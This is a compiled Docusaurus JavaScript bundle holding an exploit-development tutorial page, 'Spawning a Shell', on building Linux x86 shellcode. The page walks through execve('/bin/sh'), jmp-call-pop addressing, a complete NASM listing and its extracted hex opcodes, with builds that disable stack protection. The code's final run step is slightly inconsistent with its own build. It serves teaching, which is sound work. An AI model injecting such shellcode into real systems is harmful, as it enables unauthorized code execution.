"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[51087],{83241:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>t,default:()=>x,frontMatter:()=>l,metadata:()=>r,toc:()=>d});var i=s(74848),c=s(28453);const l={},t="Spawning a Shell",r={id:"cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/spawning_shell/README",title:"Spawning a Shell",description:"The easiest and quickest way to create a shell is to create a new process.",source:"@site/docs/cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/3_spawning_shell/README.md",sourceDirName:"cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/3_spawning_shell",slug:"/cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/spawning_shell/",permalink:"/docs/cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/spawning_shell/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"docsSidebar",previous:{title:"Injectable Shellcode",permalink:"/docs/cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/creating_injectable_exit_shellcode/"},next:{title:"Introduction to Format String Bugs",permalink:"/docs/cybersecurity/Offensive/exploit_dev/intro_linux_x86/shellcode/intro_format_string_bugs/"}},o={},d=[{value:"Review of <code>execve</code> System Call",id:"review-of-execve-system-call",level:2},{value:"Relative Addressing",id:"relative-addressing",level:2}];function a(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"spawning-a-shell",children:"Spawning a Shell"})}),"\n",(0,i.jsx)(n.p,{children:"The easiest and quickest way to create a shell is to create a new process."}),"\n",(0,i.jsx)(n.p,{children:"There are two ways to do this in Linux:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Creating a process that will replace the parent process using ",(0,i.jsx)(n.code,{children:"execve()"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:["Creating a copy of the parent process using ",(0,i.jsx)(n.code,{children:"fork()"})," and ",(0,i.jsx)(n.code,{children:"execve()"}),"."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["Here's ",(0,i.jsx)(n.code,{children:"./spawnshell.c"})," of using the former:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",metastring:'title="spawnshell.c"',children:'#include <stdio.h>\nint main()\n{\n    char *happy[2];\n    happy[0] = "/bin/sh";\n    happy[1] = NULL;\n    execve(happy[0], happy, NULL);\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["To make this injectable, we need to translate it into opcodes. We need to use ",(0,i.jsx)(n.code,{children:"-static"})," flag with ",(0,i.jsx)(n.code,{children:"gcc"})," to prevent dynamic linking."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"gcc -o spawnshell -fno-stack-protector -m32 -ggdb -static spawnshell.c\n./spawnshell\n\n$ whoami\nkobbi\n"})}),"\n",(0,i.jsxs)(n.h2,{id:"review-of-execve-system-call",children:["Review of ",(0,i.jsx)(n.code,{children:"execve"})," System Call"]}),"\n",(0,i.jsxs)(n.p,{children:["If we look at the signature of the ",(0,i.jsx)(n.code,{children:"execve"})," method using its ",(0,i.jsx)(n.code,{children:"man"})," page, we can see that it expects 3 arguments:"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"int execve(const char *pathname, char *const argv[], char *const envp[]);\n"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["The first argument is a pointer to the name/path of the interpreter (",(0,i.jsx)(n.code,{children:"sh"})," in our case)."]}),"\n",(0,i.jsx)(n.li,{children:"The second argument is a pointer to an array of arguments passed to the interpreter."}),"\n",(0,i.jsx)(n.li,{children:"The third is a pointer to an array of environmental variable key-value pairs."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"To use this syscall, we need to pass data to 4 registers."}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"EAX"})," will hold the syscall number for ",(0,i.jsx)(n.code,{children:"execve"})," which is decimal 11 or ",(0,i.jsx)(n.code,{children:"0x0b"})," (see ",(0,i.jsx)(n.a,{href:"http://faculty.nps.edu/cseagle/assembly/sys_call.html",children:"Linux System Call Table"}),"). The rest of the registers (",(0,i.jsx)(n.code,{children:"EBX"}),", ",(0,i.jsx)(n.code,{children:"ECX"}),", ",(0,i.jsx)(n.code,{children:"EDX"}),") will hold the arguments."]}),"\n",(0,i.jsx)(n.p,{children:"We can see the assembly instructions here:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'(gdb) disas execve\nDump of assembler code for function execve:\n   0x0806dee0 <+0>:     endbr32 \n   0x0806dee4 <+4>:     push   %ebx\n   0x0806dee5 <+5>:     mov    0x10(%esp),%edx\n   0x0806dee9 <+9>:     mov    0xc(%esp),%ecx\n   0x0806deed <+13>:    mov    0x8(%esp),%ebx\n=> 0x0806def1 <+17>:    mov    $0xb,%eax\n   0x0806def6 <+22>:    call   *%gs:0x10\n   0x0806defd <+29>:    pop    %ebx\n   0x0806defe <+30>:    cmp    $0xfffff001,%eax\n   0x0806df03 <+35>:    jae    0x8073510 <__syscall_error>\n   0x0806df09 <+41>:    ret    \nEnd of assembler dump.\n\n(gdb) i r\neax            0xb                 11\necx            0xffffcc74          -13196\nedx            0x0                 0\nebx            0x80b4008           134955016\nesp            0xffffcc58          0xffffcc58\nebp            0xffffcc88          0xffffcc88\neip            0x806def6           0x806def6 <execve+22>\n\n(gdb) x/s $ebx\n0x80b4008:      "/bin/sh"\n\n'})}),"\n",(0,i.jsx)(n.p,{children:"As expected, we see that:"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"EAX"})," holds ",(0,i.jsx)(n.code,{children:"0xb"})," which is syscall 11."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"EBX"})," holds the first argument to ",(0,i.jsx)(n.code,{children:"execve()"}),", the interpreter path ",(0,i.jsx)(n.code,{children:"/bin/sh"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"ECX"})," holds the address to the argument array."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"EDX"})," holds the address of ",(0,i.jsx)(n.code,{children:"NULL"}),"."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["However, since ",(0,i.jsx)(n.code,{children:"ECX"})," and ",(0,i.jsx)(n.code,{children:"EDX"})," hold hardcoded addresses, the shellcode would break if we use them in different systems."]}),"\n",(0,i.jsxs)(n.p,{children:["To get around this problem, we use ",(0,i.jsx)(n.strong,{children:"relative addressing"}),"."]}),"\n",(0,i.jsx)(n.h2,{id:"relative-addressing",children:"Relative Addressing"}),"\n",(0,i.jsxs)(n.p,{children:["The classical way to use relative addressing involves placing the beginning address of the shellcode into a register.\nTo do this, we start the shellcode off with a ",(0,i.jsx)(n.code,{children:"jmp"})," instruction to the ",(0,i.jsx)(n.code,{children:"call"})," instruction. When the ",(0,i.jsx)(n.code,{children:"call"})," instruction is executed, the address of the instructions immediately following the ",(0,i.jsx)(n.code,{children:"call"})," instruction is pushed onto the stack. We need to place whatever we want to use as the base relative address directly following the ",(0,i.jsx)(n.code,{children:"call"})," instruction. Since we want our shellcode to be executed, we will have the ",(0,i.jsx)(n.code,{children:"call"})," instruction call the instruction immediately following the initial ",(0,i.jsx)(n.code,{children:"jmp"}),".\nThe last step is to add the ",(0,i.jsx)(n.code,{children:"pop esi"})," instruction right after the first ",(0,i.jsx)(n.code,{children:"jmp"})," instruction. This will allow us to reference different bytes in our shellcode by using the distance/offset from ",(0,i.jsx)(n.code,{children:"esi"}),"."]}),"\n",(0,i.jsx)(n.p,{children:"Here is some pseudo-code to illustrate how it would look:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"    jmp short   GotoCall\n\nshellcode:\n    pop esi\n    ...\n    <shellcode>\n    ...\n\nGotoCall:\n    call    shellcode\n    db      '/bin/sh' ; define byte sets aside space in memory for a string\n"})}),"\n",(0,i.jsxs)(n.p,{children:["See the full assembly code ",(0,i.jsx)(n.code,{children:"execve.asm"}),":"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-armasm",metastring:'title="execve.asm"',children:"Section .text\n\n global _start\n \n \n_start:\n jmp  GotoCall\n \nshellcode:\n pop         esi\n xor         eax, eax            ; set eax to null\n mov byte [esi + 7], al       ; terminate /bin/sh with null, overwriting J\n lea         ebx, [esi]          ; copy address of beginning of /bin/sh to ebx\n mov long [esi + 8], ebx      ; copy address of beginning of /bin/sh over AAAA\n mov long [esi + 12], eax     ; copy nulls over KKKK\n mov byte al, 0x0b            ; copy syscall\n mov         ebx, esi            ; copy address of /bin/sh into ebx\n lea         ecx, [esi + 8]      ; copy pointer to /bin/sh into ecx\n lea         edx, [esi + 12]     ; copy pointer to null into edx\n int         0x80                ; call interrupt\n \nGotoCall:\n call shellcode\n db '/bin/shJAAAAKKKK' ; JAAAAKKKK are placeholders used for reference. will be overwritten\n"})}),"\n",(0,i.jsx)(n.p,{children:"Compile it using:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nasm -f elf -o execve.o -g execve.asm\nld -m elf_i386 -s -o execve execve.o\n"})}),"\n",(0,i.jsx)(n.p,{children:"We can then get the opcodes:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"objdump -d execve | cut  -f2 | awk \"NR > 7\" | xargs | sed 's/ /\\\\x/g'\n\neb\\x1a\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\\x1e\\x89\\x5e\\x08\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\xe8\\xe1\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x4a\\x41\\x41\\x41\\x41\\x4b\\x4b\\x4b\\x4b\n"})}),"\n",(0,i.jsx)(n.p,{children:"Compile and run:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",metastring:'title="execve.c"',children:'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint\nmain(int argc, char *argv[])\n{\n    char *newargv[] = { NULL, "hello", "world", NULL };\n    char *newenviron[] = { NULL };\n\n    if (argc != 2) {\n        fprintf(stderr, "Usage: %s <file-to-exec>\\n", argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    newargv[0] = argv[1];\n\n    execve(argv[1], newargv, newenviron);\n    perror("execve");   /* execve() returns only on error */\n    exit(EXIT_FAILURE);\n}\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"gcc -fno-stack-protector -z execstack -o execve_run -ggdb execve.c\n./execve\n"})})]})}function x(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>r});var i=s(96540);const c={},l=i.createContext(c);function t(e){const n=i.useContext(l);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:t(e.components),i.createElement(l.Provider,{value:n},e.children)}}}]);